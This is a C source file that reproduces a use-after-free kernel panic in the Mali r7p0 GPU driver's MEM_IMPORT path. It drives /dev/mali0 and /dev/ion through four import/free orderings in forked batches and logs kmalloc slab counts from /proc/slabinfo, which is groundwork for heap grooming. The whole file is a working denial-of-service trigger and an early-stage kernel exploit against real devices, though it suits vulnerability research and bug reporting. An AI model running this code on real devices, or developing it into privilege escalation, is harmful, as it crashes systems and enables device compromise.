/*
 * mali_import_crash.c — Minimal reproducer for Mali MEM_IMPORT kernel panic
 *
 * FINDING: Mali r7p0 MEM_IMPORT path crashes kernel with:
 *   PC is at _raw_spin_lock_irqsave+0x30/0x6c
 *   LR is at down+0x18/0x54
 *
 * This indicates a use-after-free of a semaphore — the kernel tries to
 * acquire a semaphore whose memory has been freed and potentially reclaimed.
 *
 * This tool performs CAREFUL, incremental import+free cycles to find
 * the exact iteration count that triggers the crash. Each batch is
 * isolated in a child process with alarm() timeout.
 *
 * Usage: mali_import_crash [batch_size] [num_batches]
 *   Default: 10 imports per batch, 50 batches (total 500)
 *
 * Build: arm-linux-gnueabi-gcc -static -pie -fPIE -o mali_import_crash mali_import_crash.c -lpthread
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <unistd.h>

#define DEV_PATH "/dev/mali0"

struct uk_header { uint32_t id; uint32_t ret; };

static unsigned int make_cmd(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, sz);
}

static int mali_open_ctx(void) {
    int fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;
    uint8_t hb[16];
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0;
    hb[8] = 10;
    if (ioctl(fd, make_cmd(16), hb) < 0) { close(fd); return -1; }
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530;
    if (ioctl(fd, make_cmd(16), hb) < 0) { close(fd); return -1; }
    return fd;
}

static uint64_t mali_alloc(int fd, uint32_t pages, uint64_t flags) {
    uint8_t buf[56];
    memset(buf, 0, 56);
    ((struct uk_header*)buf)->id = 512;
    *(uint64_t*)(buf + 8) = pages;
    *(uint64_t*)(buf + 16) = pages;
    *(uint64_t*)(buf + 32) = flags;
    if (ioctl(fd, make_cmd(56), buf) < 0) return 0;
    if (((struct uk_header*)buf)->id != 0) return 0;
    return *(uint64_t*)(buf + 40);
}

static int mali_free(int fd, uint64_t va) {
    uint8_t buf[16];
    memset(buf, 0, 16);
    ((struct uk_header*)buf)->id = 516;
    *(uint64_t*)(buf + 8) = va;
    int r = ioctl(fd, make_cmd(16), buf);
    return (r == 0 && ((struct uk_header*)buf)->id == 0) ? 0 : -1;
}

static int ion_alloc_fd(int ion_fd) {
    struct {
        uint64_t len;
        uint64_t align;
        uint32_t heap_id_mask;
        uint32_t flags;
        int32_t  fd;
    } data = { .len = 4096, .align = 4096, .heap_id_mask = 1, .flags = 0, .fd = -1 };

    if (ioctl(ion_fd, 0xc0144900, &data) == 0 && data.fd >= 0)
        return data.fd;
    return -1;
}

static int mali_import(int fd, int dma_buf_fd, uint64_t *out_va) {
    uint8_t buf[48];
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;  /* MEM_IMPORT */
    *(uint64_t*)(buf + 8) = (uint64_t)dma_buf_fd;
    *(uint64_t*)(buf + 16) = 1;  /* type = UMM (dma-buf) */
    int r = ioctl(fd, make_cmd(48), buf);
    if (r == 0 && ((struct uk_header*)buf)->id == 0) {
        if (out_va) *out_va = *(uint64_t*)(buf + 32);
        return 0;
    }
    return -1;
}

/* Read slab stats for crash forensics */
static void print_slab(const char *label) {
    fprintf(stderr, "[SLAB %s] ", label);
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) { fprintf(stderr, "cannot read\n"); return; }
    char line[512];
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, "kmalloc-64 ") || strstr(line, "kmalloc-128 ") ||
            strstr(line, "kmalloc-256 ")) {
            char name[64]; int active, total;
            if (sscanf(line, "%63s %d %d", name, &active, &total) == 3)
                fprintf(stderr, "%s=%d/%d ", name, active, total);
        }
    }
    fclose(f);
    fprintf(stderr, "\n");
}

/* === STRATEGY A: import+free, reuse same Mali context === */
static int run_import_batch_reuse_ctx(int batch_size) {
    int mali_fd = mali_open_ctx();
    int ion_fd = open("/dev/ion", O_RDONLY | O_CLOEXEC);
    if (mali_fd < 0 || ion_fd < 0) return -1;

    int ok = 0, fail = 0;
    for (int i = 0; i < batch_size; i++) {
        int dma_fd = ion_alloc_fd(ion_fd);
        if (dma_fd < 0) { fail++; continue; }

        uint64_t gpu_va = 0;
        int r = mali_import(mali_fd, dma_fd, &gpu_va);
        if (r == 0) {
            ok++;
            mali_free(mali_fd, gpu_va);
        } else {
            fail++;
        }
        close(dma_fd);
    }

    close(ion_fd);
    close(mali_fd);
    return ok;
}

/* === STRATEGY B: import, DON'T free (let context close do cleanup) === */
static int run_import_batch_no_free(int batch_size) {
    int mali_fd = mali_open_ctx();
    int ion_fd = open("/dev/ion", O_RDONLY | O_CLOEXEC);
    if (mali_fd < 0 || ion_fd < 0) return -1;

    int ok = 0;
    int dma_fds[512];
    int n_fds = 0;

    for (int i = 0; i < batch_size && i < 512; i++) {
        int dma_fd = ion_alloc_fd(ion_fd);
        if (dma_fd < 0) continue;

        uint64_t gpu_va = 0;
        int r = mali_import(mali_fd, dma_fd, &gpu_va);
        if (r == 0) {
            ok++;
            /* Don't mali_free — let close(mali_fd) clean up */
        }
        dma_fds[n_fds++] = dma_fd;
    }

    /* Close mali context — triggers cleanup of all imported regions */
    close(mali_fd);

    /* Now close ION fds */
    for (int i = 0; i < n_fds; i++)
        close(dma_fds[i]);
    close(ion_fd);

    return ok;
}

/* === STRATEGY C: import, close ION fd BEFORE mali_free === */
static int run_import_close_before_free(int batch_size) {
    int mali_fd = mali_open_ctx();
    int ion_fd = open("/dev/ion", O_RDONLY | O_CLOEXEC);
    if (mali_fd < 0 || ion_fd < 0) return -1;

    int ok = 0;
    for (int i = 0; i < batch_size; i++) {
        int dma_fd = ion_alloc_fd(ion_fd);
        if (dma_fd < 0) continue;

        uint64_t gpu_va = 0;
        int r = mali_import(mali_fd, dma_fd, &gpu_va);
        if (r == 0) {
            /* Close dma_buf fd BEFORE mali_free — drops one ref */
            close(dma_fd);
            /* Now free — mali should drop its ref */
            mali_free(mali_fd, gpu_va);
            ok++;
        } else {
            close(dma_fd);
        }
    }

    close(ion_fd);
    close(mali_fd);
    return ok;
}

/* === STRATEGY D: import, close ION master fd, THEN mali_free === */
static int run_import_close_ion_master(int batch_size) {
    int mali_fd = mali_open_ctx();

    int ok = 0;
    for (int i = 0; i < batch_size; i++) {
        /* Open fresh ION fd each time */
        int ion_fd = open("/dev/ion", O_RDONLY | O_CLOEXEC);
        if (ion_fd < 0) continue;

        int dma_fd = ion_alloc_fd(ion_fd);
        /* Close ION master fd immediately */
        close(ion_fd);
        if (dma_fd < 0) continue;

        uint64_t gpu_va = 0;
        int r = mali_import(mali_fd, dma_fd, &gpu_va);
        if (r == 0) {
            ok++;
            close(dma_fd);  /* Close dma_buf */
            mali_free(mali_fd, gpu_va);
        } else {
            close(dma_fd);
        }
    }

    close(mali_fd);
    return ok;
}

int main(int argc, char **argv) {
    int batch_size = 10;
    int num_batches = 50;
    char strategy = 'A';

    if (argc >= 2) strategy = argv[1][0];
    if (argc >= 3) batch_size = atoi(argv[2]);
    if (argc >= 4) num_batches = atoi(argv[3]);

    fprintf(stderr, "=== Mali MEM_IMPORT Crash Reproducer ===\n");
    fprintf(stderr, "Strategy %c | batch=%d | batches=%d | total=%d\n",
            strategy, batch_size, num_batches, batch_size * num_batches);
    fprintf(stderr, "PID=%d\n\n", getpid());

    print_slab("START");

    int total_ok = 0;
    int crashed_batch = -1;

    for (int b = 0; b < num_batches; b++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(10);
            int ok = 0;
            switch (strategy) {
                case 'A': case 'a': ok = run_import_batch_reuse_ctx(batch_size); break;
                case 'B': case 'b': ok = run_import_batch_no_free(batch_size); break;
                case 'C': case 'c': ok = run_import_close_before_free(batch_size); break;
                case 'D': case 'd': ok = run_import_close_ion_master(batch_size); break;
                default: _exit(99);
            }
            _exit(ok >= 0 ? 0 : 1);
        }

        int status;
        waitpid(pid, &status, 0);

        if (WIFSIGNALED(status)) {
            fprintf(stderr, "[batch %d] KILLED by signal %d after %d total imports\n",
                    b, WTERMSIG(status), total_ok);
            crashed_batch = b;
            break;
        } else if (WIFEXITED(status) && WEXITSTATUS(status) == 14) {
            fprintf(stderr, "[batch %d] TIMEOUT after %d total imports\n",
                    b, total_ok);
            crashed_batch = b;
            break;
        }

        total_ok += batch_size;

        /* Progress every 10 batches */
        if ((b + 1) % 10 == 0 || b == num_batches - 1) {
            fprintf(stderr, "[batch %d/%d] %d imports OK\n",
                    b + 1, num_batches, total_ok);
        }
    }

    print_slab("END");

    if (crashed_batch >= 0) {
        fprintf(stderr, "\n*** CRASH at batch %d (after ~%d imports) ***\n",
                crashed_batch, crashed_batch * batch_size);
    } else {
        fprintf(stderr, "\nAll %d batches completed (%d imports total)\n",
                num_batches, total_ok);
    }

    /* Grab dmesg */
    fprintf(stderr, "\n--- dmesg (mali/kbase) ---\n");
    system("dmesg 2>/dev/null | grep -iE 'mali|kbase|oops|bug|panic|fault' | tail -20 2>/dev/null");

    fprintf(stderr, "\n=== Done ===\n");
    return (crashed_batch >= 0) ? 1 : 0;
}
